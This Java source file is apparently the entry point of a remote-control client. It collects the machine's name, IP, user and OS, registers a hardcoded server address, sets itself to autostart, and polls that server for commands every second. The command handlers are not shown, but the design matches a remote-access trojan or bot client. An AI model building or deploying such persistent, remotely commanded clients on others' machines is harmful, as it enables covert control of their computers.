package ch.lebois.client;

import ch.lebois.client.configure.Autostart;
import ch.lebois.client.configure.ClientConfigure;
import ch.lebois.client.handler.CommandReader;

public class ClientApplication {

    public static void main(String[] args) {
        ClientConfigure clientConfigure = new ClientConfigure();
        clientConfigure.setPcName();
        clientConfigure.setServer("http://84.72.78.49:8090/");
        clientConfigure.setArch("2.6");
        clientConfigure.setIp();
        clientConfigure.setPcUser();
        clientConfigure.setOs();

        new Autostart().decide();

        while (true) {
            CommandReader.read();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
